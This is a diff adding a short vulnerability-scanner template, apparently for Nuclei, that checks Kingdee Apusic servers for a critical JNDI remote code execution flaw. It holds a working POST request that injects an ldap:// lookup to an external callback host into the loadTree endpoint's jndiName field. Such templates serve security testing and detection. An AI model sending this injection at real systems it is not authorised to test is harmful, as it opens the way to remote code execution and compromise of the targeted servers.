@@ -1,0 +1,24 @@
+id: kingdee-apusic-loadtree-jndi
+
+info:
+  name: Kingdee Apusic loadtree - JNDI RCE
+  author: qwtd
+  severity: critical
+  description: Kingdee Apusic loadtree is vulnerable to jndi rce.
+  reference:
+    - https://blog.csdn.net/qq_36618918/article/details/135401070
+  tags: 金蝶-APUSIC,kingdee-EAS
+
+http:
+  - raw:
+      - |
+        POST /appmonitor/protect/jndi/loadTree HTTP/1.1
+        Host:{{Hostname}}
+
+        jndiName==ldap://{{interactsh-url}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
